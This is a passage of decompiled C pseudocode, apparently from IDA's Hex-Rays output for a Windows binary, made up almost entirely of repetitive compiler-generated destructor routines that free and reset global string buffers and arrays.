      v0 = (_BYTE *)*((_DWORD *)dword_4FA240 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA240 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA250 = 0;
  dword_4FA254 = 15;
  LOBYTE(dword_4FA240) = 0;
}
// 4FA250: using guessed type int dword_4FA250;
// 4FA254: using guessed type int dword_4FA254;

//----- (0048D4A0) --------------------------------------------------------
void __cdecl sub_48D4A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA1F4 >= 0x10 )
  {
    v0 = dword_4FA1E0;
    if ( (unsigned int)(dword_4FA1F4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA1E0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA1E0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA1F0 = 0;
  dword_4FA1F4 = 15;
  LOBYTE(dword_4FA1E0) = 0;
}
// 4FA1F0: using guessed type int dword_4FA1F0;
// 4FA1F4: using guessed type int dword_4FA1F4;

//----- (0048D500) --------------------------------------------------------
void __cdecl sub_48D500()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA554 >= 0x10 )
  {
    v0 = dword_4FA540;
    if ( (unsigned int)(dword_4FA554 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA540 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA540 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA550 = 0;
  dword_4FA554 = 15;
  LOBYTE(dword_4FA540) = 0;
}
// 4FA550: using guessed type int dword_4FA550;
// 4FA554: using guessed type int dword_4FA554;

//----- (0048D560) --------------------------------------------------------
void __cdecl sub_48D560()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA23C >= 0x10 )
  {
    v0 = dword_4FA228;
    if ( (unsigned int)(dword_4FA23C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA228 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA228 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA238 = 0;
  dword_4FA23C = 15;
  LOBYTE(dword_4FA228) = 0;
}
// 4FA238: using guessed type int dword_4FA238;
// 4FA23C: using guessed type int dword_4FA23C;

//----- (0048D5C0) --------------------------------------------------------
void __cdecl sub_48D5C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA20C >= 0x10 )
  {
    v0 = dword_4FA1F8;
    if ( (unsigned int)(dword_4FA20C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA1F8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA1F8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA208 = 0;
  dword_4FA20C = 15;
  LOBYTE(dword_4FA1F8) = 0;
}
// 4FA208: using guessed type int dword_4FA208;
// 4FA20C: using guessed type int dword_4FA20C;

//----- (0048D620) --------------------------------------------------------
void __cdecl sub_48D620()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA11C >= 0x10 )
  {
    v0 = dword_4FA108;
    if ( (unsigned int)(dword_4FA11C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA108 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA108 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA118 = 0;
  dword_4FA11C = 15;
  LOBYTE(dword_4FA108) = 0;
}
// 4FA118: using guessed type int dword_4FA118;
// 4FA11C: using guessed type int dword_4FA11C;

//----- (0048D680) --------------------------------------------------------
void __cdecl sub_48D680()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA584 >= 0x10 )
  {
    v0 = dword_4FA570;
    if ( (unsigned int)(dword_4FA584 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA570 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA570 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA580 = 0;
  dword_4FA584 = 15;
  LOBYTE(dword_4FA570) = 0;
}
// 4FA580: using guessed type int dword_4FA580;
// 4FA584: using guessed type int dword_4FA584;

//----- (0048D6E0) --------------------------------------------------------
void __cdecl sub_48D6E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA3EC >= 0x10 )
  {
    v0 = dword_4FA3D8;
    if ( (unsigned int)(dword_4FA3EC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA3D8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA3D8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA3E8 = 0;
  dword_4FA3EC = 15;
  LOBYTE(dword_4FA3D8) = 0;
}
// 4FA3E8: using guessed type int dword_4FA3E8;
// 4FA3EC: using guessed type int dword_4FA3EC;

//----- (0048D740) --------------------------------------------------------
void __cdecl sub_48D740()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA4DC >= 0x10 )
  {
    v0 = dword_4FA4C8;
    if ( (unsigned int)(dword_4FA4DC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA4C8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA4C8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA4D8 = 0;
  dword_4FA4DC = 15;
  LOBYTE(dword_4FA4C8) = 0;
}
// 4FA4D8: using guessed type int dword_4FA4D8;
// 4FA4DC: using guessed type int dword_4FA4DC;

//----- (0048D7A0) --------------------------------------------------------
void __cdecl sub_48D7A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA374 >= 0x10 )
  {
    v0 = dword_4FA360;
    if ( (unsigned int)(dword_4FA374 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA360 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA360 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA370 = 0;
  dword_4FA374 = 15;
  LOBYTE(dword_4FA360) = 0;
}
// 4FA370: using guessed type int dword_4FA370;
// 4FA374: using guessed type int dword_4FA374;

//----- (0048D800) --------------------------------------------------------
void __cdecl sub_48D800()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA464 >= 0x10 )
  {
    v0 = dword_4FA450;
    if ( (unsigned int)(dword_4FA464 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA450 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA450 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA460 = 0;
  dword_4FA464 = 15;
  LOBYTE(dword_4FA450) = 0;
}
// 4FA460: using guessed type int dword_4FA460;
// 4FA464: using guessed type int dword_4FA464;

//----- (0048D860) --------------------------------------------------------
void __cdecl sub_48D860()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA29C >= 0x10 )
  {
    v0 = dword_4FA288;
    if ( (unsigned int)(dword_4FA29C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA288 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA288 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA298 = 0;
  dword_4FA29C = 15;
  LOBYTE(dword_4FA288) = 0;
}
// 4FA298: using guessed type int dword_4FA298;
// 4FA29C: using guessed type int dword_4FA29C;

//----- (0048D8C0) --------------------------------------------------------
void __cdecl sub_48D8C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA2B4 >= 0x10 )
  {
    v0 = dword_4FA2A0;
    if ( (unsigned int)(dword_4FA2B4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA2A0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA2A0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA2B0 = 0;
  dword_4FA2B4 = 15;
  LOBYTE(dword_4FA2A0) = 0;
}
// 4FA2B0: using guessed type int dword_4FA2B0;
// 4FA2B4: using guessed type int dword_4FA2B4;

//----- (0048D920) --------------------------------------------------------
void __cdecl sub_48D920()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA50C >= 0x10 )
  {
    v0 = dword_4FA4F8;
    if ( (unsigned int)(dword_4FA50C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA4F8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA4F8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA508 = 0;
  dword_4FA50C = 15;
  LOBYTE(dword_4FA4F8) = 0;
}
// 4FA508: using guessed type int dword_4FA508;
// 4FA50C: using guessed type int dword_4FA50C;

//----- (0048D980) --------------------------------------------------------
void __cdecl sub_48D980()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA4AC >= 0x10 )
  {
    v0 = dword_4FA498;
    if ( (unsigned int)(dword_4FA4AC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA498 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA498 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA4A8 = 0;
  dword_4FA4AC = 15;
  LOBYTE(dword_4FA498) = 0;
}
// 4FA4A8: using guessed type int dword_4FA4A8;
// 4FA4AC: using guessed type int dword_4FA4AC;

//----- (0048D9E0) --------------------------------------------------------
void __cdecl sub_48D9E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA17C >= 0x10 )
  {
    v0 = dword_4FA168;
    if ( (unsigned int)(dword_4FA17C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA168 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA168 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA178 = 0;
  dword_4FA17C = 15;
  LOBYTE(dword_4FA168) = 0;
}
// 4FA178: using guessed type int dword_4FA178;
// 4FA17C: using guessed type int dword_4FA17C;

//----- (0048DA40) --------------------------------------------------------
void __cdecl sub_48DA40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA3D4 >= 0x10 )
  {
    v0 = dword_4FA3C0;
    if ( (unsigned int)(dword_4FA3D4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA3C0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA3C0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA3D0 = 0;
  dword_4FA3D4 = 15;
  LOBYTE(dword_4FA3C0) = 0;
}
// 4FA3D0: using guessed type int dword_4FA3D0;
// 4FA3D4: using guessed type int dword_4FA3D4;

//----- (0048DAA0) --------------------------------------------------------
void __cdecl sub_48DAA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA38C >= 0x10 )
  {
    v0 = dword_4FA378;
    if ( (unsigned int)(dword_4FA38C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA378 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA378 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA388 = 0;
  dword_4FA38C = 15;
  LOBYTE(dword_4FA378) = 0;
}
// 4FA388: using guessed type int dword_4FA388;
// 4FA38C: using guessed type int dword_4FA38C;

//----- (0048DB00) --------------------------------------------------------
void __cdecl sub_48DB00()
{
  if ( !byte_500AA0 )
    j_j__free(dword_500AA4);
}
// 500AA0: using guessed type char byte_500AA0;

//----- (0048DB20) --------------------------------------------------------
void __cdecl sub_48DB20()
{
  if ( !byte_500C3C )
    j_j__free(Destination);
}
// 500C3C: using guessed type char byte_500C3C;

//----- (0048DB40) --------------------------------------------------------
void __cdecl sub_48DB40()
{
  if ( !byte_5009F0 )
    j_j__free((void *)lpMultiByteStr);
}
// 5009F0: using guessed type char byte_5009F0;

//----- (0048DB60) --------------------------------------------------------
void __cdecl sub_48DB60()
{
  if ( !byte_500AC4 )
    j_j__free((void *)dword_500AC8);
}
// 500AC4: using guessed type char byte_500AC4;

//----- (0048DB80) --------------------------------------------------------
void __cdecl sub_48DB80()
{
  if ( !byte_500AEC )
    j_j__free((void *)lpszLongPath);
}
// 500AEC: using guessed type char byte_500AEC;

//----- (0048DBA0) --------------------------------------------------------
void __cdecl sub_48DBA0()
{
  if ( !byte_500C54 )
    j_j__free(dword_500C58);
}
// 500C54: using guessed type char byte_500C54;

//----- (0048DBC0) --------------------------------------------------------
void __cdecl sub_48DBC0()
{
  `eh vector destructor iterator'(&dword_500B60, 0xCu, 0x10u, (void (__thiscall *)(void *))sub_421C40);
}
// 500B60: using guessed type int dword_500B60;

//----- (0048DBE0) --------------------------------------------------------
void __cdecl sub_48DBE0()
{
  `eh vector destructor iterator'(&unk_500AF8, 0x18u, 4u, (void (__thiscall *)(void *))sub_421DE0);
}

//----- (0048DC00) --------------------------------------------------------
void __cdecl sub_48DC00()
{
  char *v0; // esi

  if ( dword_500AB0 )
  {
    v0 = (char *)dword_500AB0 - 4;
    `eh vector destructor iterator'(
      dword_500AB0,
      0x18u,
      *((_DWORD *)dword_500AB0 - 1),
      (void (__thiscall *)(void *))sub_421DE0);
    sub_447DEF(v0);
  }
}

//----- (0048DC70) --------------------------------------------------------
void __cdecl sub_48DC70()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA59C >= 0x10 )
  {
    v0 = dword_4FA588;
    if ( (unsigned int)(dword_4FA59C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA588 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA588 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA598 = 0;
  dword_4FA59C = 15;
  LOBYTE(dword_4FA588) = 0;
}
// 4FA598: using guessed type int dword_4FA598;
// 4FA59C: using guessed type int dword_4FA59C;

//----- (0048DCD0) --------------------------------------------------------
void __cdecl sub_48DCD0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA8E4 >= 0x10 )
  {
    v0 = dword_4FA8D0;
    if ( (unsigned int)(dword_4FA8E4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA8D0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA8D0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA8E0 = 0;
  dword_4FA8E4 = 15;
  LOBYTE(dword_4FA8D0) = 0;
}
// 4FA8E0: using guessed type int dword_4FA8E0;
// 4FA8E4: using guessed type int dword_4FA8E4;

//----- (0048DD30) --------------------------------------------------------
void __cdecl sub_48DD30()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA71C >= 0x10 )
  {
    v0 = dword_4FA708;
    if ( (unsigned int)(dword_4FA71C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA708 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA708 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA718 = 0;
  dword_4FA71C = 15;
  LOBYTE(dword_4FA708) = 0;
}
// 4FA718: using guessed type int dword_4FA718;
// 4FA71C: using guessed type int dword_4FA71C;

//----- (0048DD90) --------------------------------------------------------
void __cdecl sub_48DD90()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA65C >= 0x10 )
  {
    v0 = dword_4FA648;
    if ( (unsigned int)(dword_4FA65C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA648 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA648 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA658 = 0;
  dword_4FA65C = 15;
  LOBYTE(dword_4FA648) = 0;
}
// 4FA658: using guessed type int dword_4FA658;
// 4FA65C: using guessed type int dword_4FA65C;

//----- (0048DDF0) --------------------------------------------------------
void __cdecl sub_48DDF0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA7DC >= 0x10 )
  {
    v0 = dword_4FA7C8;
    if ( (unsigned int)(dword_4FA7DC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA7C8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA7C8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA7D8 = 0;
  dword_4FA7DC = 15;
  LOBYTE(dword_4FA7C8) = 0;
}
// 4FA7D8: using guessed type int dword_4FA7D8;
// 4FA7DC: using guessed type int dword_4FA7DC;

//----- (0048DE50) --------------------------------------------------------
void __cdecl sub_48DE50()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA92C >= 0x10 )
  {
    v0 = dword_4FA918;
    if ( (unsigned int)(dword_4FA92C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA918 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA918 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA928 = 0;
  dword_4FA92C = 15;
  LOBYTE(dword_4FA918) = 0;
}
// 4FA928: using guessed type int dword_4FA928;
// 4FA92C: using guessed type int dword_4FA92C;

//----- (0048DEB0) --------------------------------------------------------
void __cdecl sub_48DEB0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA764 >= 0x10 )
  {
    v0 = dword_4FA750;
    if ( (unsigned int)(dword_4FA764 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA750 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA750 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA760 = 0;
  dword_4FA764 = 15;
  LOBYTE(dword_4FA750) = 0;
}
// 4FA760: using guessed type int dword_4FA760;
// 4FA764: using guessed type int dword_4FA764;

//----- (0048DF10) --------------------------------------------------------
void __cdecl sub_48DF10()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA914 >= 0x10 )
  {
    v0 = dword_4FA900;
    if ( (unsigned int)(dword_4FA914 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA900 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA900 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA910 = 0;
  dword_4FA914 = 15;
  LOBYTE(dword_4FA900) = 0;
}
// 4FA910: using guessed type int dword_4FA910;
// 4FA914: using guessed type int dword_4FA914;

//----- (0048DF70) --------------------------------------------------------
void __cdecl sub_48DF70()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA77C >= 0x10 )
  {
    v0 = dword_4FA768;
    if ( (unsigned int)(dword_4FA77C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA768 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA768 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA778 = 0;
  dword_4FA77C = 15;
  LOBYTE(dword_4FA768) = 0;
}
// 4FA778: using guessed type int dword_4FA778;
// 4FA77C: using guessed type int dword_4FA77C;

//----- (0048DFD0) --------------------------------------------------------
void __cdecl sub_48DFD0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA98C >= 0x10 )
  {
    v0 = dword_4FA978;
    if ( (unsigned int)(dword_4FA98C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA978 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA978 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA988 = 0;
  dword_4FA98C = 15;
  LOBYTE(dword_4FA978) = 0;
}
// 4FA988: using guessed type int dword_4FA988;
// 4FA98C: using guessed type int dword_4FA98C;

//----- (0048E030) --------------------------------------------------------
void __cdecl sub_48E030()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA8B4 >= 0x10 )
  {
    v0 = dword_4FA8A0;
    if ( (unsigned int)(dword_4FA8B4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA8A0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA8A0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA8B0 = 0;
  dword_4FA8B4 = 15;
  LOBYTE(dword_4FA8A0) = 0;
}
// 4FA8B0: using guessed type int dword_4FA8B0;
// 4FA8B4: using guessed type int dword_4FA8B4;

//----- (0048E090) --------------------------------------------------------
void __cdecl sub_48E090()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FAA04 >= 0x10 )
  {
    v0 = dword_4FA9F0;
    if ( (unsigned int)(dword_4FAA04 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA9F0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA9F0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FAA00 = 0;
  dword_4FAA04 = 15;
  LOBYTE(dword_4FA9F0) = 0;
}
// 4FAA00: using guessed type int dword_4FAA00;
// 4FAA04: using guessed type int dword_4FAA04;

//----- (0048E0F0) --------------------------------------------------------
void __cdecl sub_48E0F0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA83C >= 0x10 )
  {
    v0 = dword_4FA828;
    if ( (unsigned int)(dword_4FA83C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA828 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA828 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA838 = 0;
  dword_4FA83C = 15;
  LOBYTE(dword_4FA828) = 0;
}
// 4FA838: using guessed type int dword_4FA838;
// 4FA83C: using guessed type int dword_4FA83C;

//----- (0048E150) --------------------------------------------------------
void __cdecl sub_48E150()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA794 >= 0x10 )
  {
    v0 = dword_4FA780;
    if ( (unsigned int)(dword_4FA794 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA780 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA780 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA790 = 0;
  dword_4FA794 = 15;
  LOBYTE(dword_4FA780) = 0;
}
// 4FA790: using guessed type int dword_4FA790;
// 4FA794: using guessed type int dword_4FA794;

//----- (0048E1B0) --------------------------------------------------------
void __cdecl sub_48E1B0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA7AC >= 0x10 )
  {
    v0 = dword_4FA798;
    if ( (unsigned int)(dword_4FA7AC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA798 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA798 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA7A8 = 0;
  dword_4FA7AC = 15;
  LOBYTE(dword_4FA798) = 0;
}
// 4FA7A8: using guessed type int dword_4FA7A8;
// 4FA7AC: using guessed type int dword_4FA7AC;

//----- (0048E210) --------------------------------------------------------
void __cdecl sub_48E210()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA674 >= 0x10 )
  {
    v0 = dword_4FA660;
    if ( (unsigned int)(dword_4FA674 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA660 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA660 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA670 = 0;
  dword_4FA674 = 15;
  LOBYTE(dword_4FA660) = 0;
}
// 4FA670: using guessed type int dword_4FA670;
// 4FA674: using guessed type int dword_4FA674;

//----- (0048E270) --------------------------------------------------------
void __cdecl sub_48E270()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA7F4 >= 0x10 )
  {
    v0 = dword_4FA7E0;
    if ( (unsigned int)(dword_4FA7F4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA7E0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA7E0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA7F0 = 0;
  dword_4FA7F4 = 15;
  LOBYTE(dword_4FA7E0) = 0;
}
// 4FA7F0: using guessed type int dword_4FA7F0;
// 4FA7F4: using guessed type int dword_4FA7F4;

//----- (0048E2D0) --------------------------------------------------------
void __cdecl sub_48E2D0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA854 >= 0x10 )
  {
    v0 = dword_4FA840;
    if ( (unsigned int)(dword_4FA854 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA840 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA840 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA850 = 0;
  dword_4FA854 = 15;
  LOBYTE(dword_4FA840) = 0;
}
// 4FA850: using guessed type int dword_4FA850;
// 4FA854: using guessed type int dword_4FA854;

//----- (0048E330) --------------------------------------------------------
void __cdecl sub_48E330()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA8CC >= 0x10 )
  {
    v0 = dword_4FA8B8;
    if ( (unsigned int)(dword_4FA8CC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA8B8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA8B8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA8C8 = 0;
  dword_4FA8CC = 15;
  LOBYTE(dword_4FA8B8) = 0;
}
// 4FA8C8: using guessed type int dword_4FA8C8;
// 4FA8CC: using guessed type int dword_4FA8CC;

//----- (0048E390) --------------------------------------------------------
void __cdecl sub_48E390()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA89C >= 0x10 )
  {
    v0 = dword_4FA888;
    if ( (unsigned int)(dword_4FA89C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA888 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA888 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA898 = 0;
  dword_4FA89C = 15;
  LOBYTE(dword_4FA888) = 0;
}
// 4FA898: using guessed type int dword_4FA898;
// 4FA89C: using guessed type int dword_4FA89C;

//----- (0048E3F0) --------------------------------------------------------
void __cdecl sub_48E3F0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA704 >= 0x10 )
  {
    v0 = dword_4FA6F0;
    if ( (unsigned int)(dword_4FA704 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA6F0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA6F0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA700 = 0;
  dword_4FA704 = 15;
  LOBYTE(dword_4FA6F0) = 0;
}
// 4FA700: using guessed type int dword_4FA700;
// 4FA704: using guessed type int dword_4FA704;

//----- (0048E450) --------------------------------------------------------
void __cdecl sub_48E450()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA5CC >= 0x10 )
  {
    v0 = dword_4FA5B8;
    if ( (unsigned int)(dword_4FA5CC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA5B8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA5B8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA5C8 = 0;
  dword_4FA5CC = 15;
  LOBYTE(dword_4FA5B8) = 0;
}
